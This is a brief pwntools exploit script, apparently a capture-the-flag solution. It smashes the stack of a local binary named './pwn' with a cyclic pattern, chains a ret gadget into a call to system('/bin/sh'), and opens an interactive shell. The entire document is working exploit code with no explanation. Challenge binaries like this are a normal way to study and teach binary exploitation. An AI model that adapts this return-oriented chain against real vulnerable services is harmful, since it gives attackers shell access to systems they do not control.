from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

if args['REMOTE']:
    io = remote()
else:
    io = process('./pwn')

elf = ELF("./pwn")
rop = ROP(elf)

rop.raw(cyclic(0x70 + 8))
rop.raw(rop.find_gadget(["ret"]))
rop.call(elf.sym["system"], [next(elf.search(b"/bin/sh"))])

payload = rop.chain()
io.sendlineafter(b'a?\n',payload)
io.interactive()
